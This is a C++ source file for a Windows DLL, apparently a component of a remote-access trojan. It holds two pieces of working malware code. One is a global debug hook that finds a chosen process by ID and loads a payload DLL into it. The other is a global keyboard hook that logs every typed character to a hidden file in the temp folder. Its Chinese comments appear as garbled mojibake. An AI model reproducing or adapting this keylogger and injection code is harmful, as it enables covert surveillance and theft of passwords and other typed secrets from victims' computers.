
#include "stdafx.h"
#include "SshWork.h"

#pragma data_seg("Shared")
char   m_CharFileName[256] = {0};
HHOOK  g_hook = NULL;
HHOOK  g_khook = NULL;
INITDLLINFO m_InitInfo = {0};
BOOL m_IsOk = FALSE;	
#pragma data_seg()
#pragma comment(linker,"/section:Shared,rws")

HINSTANCE ghInstance = NULL;
SshWork   m_Work;

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		case DLL_PROCESS_ATTACH:
			ghInstance = (HINSTANCE) hModule;
			break;
		default : break;
    }
    return TRUE;
}

LRESULT WINAPI GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
	LRESULT lResult = CallNextHookEx(g_hook, nCode, wParam, lParam);

	//�鿴�Ƿ�Ϊָ������
	if(!m_IsOk && m_InitInfo.m_ProcessId == GetCurrentProcessId())
	{
		//�ҵ�ָ������ȡ��hook
		m_IsOk = TRUE;
		if(g_hook) UnhookWindowsHookEx(g_hook);

		//֪ͨ�������˳�
		HANDLE m_WaitEvent = 
			OpenEvent(EVENT_ALL_ACCESS,FALSE,
			m_InitInfo.m_EventName);
		if(m_WaitEvent)	
		{
			SetEvent(m_WaitEvent);
			CloseHandle(m_WaitEvent);
		}
		
		Sleep(1000);

		//װ��DLL������
		m_Work.m_Module = LoadLibrary(m_InitInfo.m_StartFile);
		if(m_Work.m_Module) 
		{
			m_Work.StartWork(&m_InitInfo);
		}
	}
	return lResult;
}

BOOL PlayWork(LPINITDLLINFO pInitInfo)
{
	//��������
	memcpy(&m_InitInfo,pInitInfo,sizeof(INITDLLINFO));

	//�Խ�������
	if(pInitInfo->m_ProcessName[0] == 2)
	{
		m_Work.StartWork(&m_InitInfo);
		return TRUE;
	}

	//����Ƿ��Ѿ�����
	if(g_hook != NULL) return FALSE;

	//����HOOK
	g_hook = SetWindowsHookEx(WH_DEBUG, GetMsgProc, ghInstance, 0);
	return (g_hook != NULL);
}

void WriteChar(char* sText)
{
	//����
	HANDLE hMetux = OpenMutex(MUTEX_ALL_ACCESS, FALSE, "PsKey400");
	if(hMetux != NULL) 
		WaitForSingleObject(hMetux, 300);

	FILE* fp = fopen(m_CharFileName,"ab");
	if(fp != NULL)
	{
		fwrite(sText,strlen(sText),1,fp);
		fclose(fp);
	}

	//ȡ��
	if(hMetux != NULL) 
	{
		ReleaseMutex(hMetux);
		CloseHandle(hMetux);
	}
}

LRESULT WINAPI GetKeyMsgProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
	LRESULT lResult = CallNextHookEx(g_khook, nCode, wParam, lParam);
	char key[10] = {0};
	BYTE buffer[256] = {0};
	WORD m_wchar = 0; 
	UINT m_scan = 0;
    if ((lParam & 0x40000000) && (nCode == HC_ACTION))
	{
		if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>= 0x2f ) &&(wParam<= 0x100))
		{
			if (wParam == VK_RETURN)
			{
				WriteChar("\r\n");
  			}
   			else
			{
    			GetKeyboardState(buffer);
    			m_scan = 0;
				ToAscii(wParam,m_scan,buffer , &m_wchar,0);
				key[0] = m_wchar%255;
				if(key[0] >= 32 && key[0] <= 126)
					WriteChar(key);
			}
  		}
	}
	return lResult;
}

BOOL KeyStartMyWork()
{
	if(g_khook != NULL) return FALSE;
	GetTempPath(200,m_CharFileName);
	strcat(m_CharFileName,"pskey.dat");
	g_khook = SetWindowsHookEx(WH_KEYBOARD,GetKeyMsgProc,ghInstance,0);
	return (g_khook != NULL);
}

void KeyStopMyWork()
{
	if(g_khook != NULL) UnhookWindowsHookEx(g_khook);
}
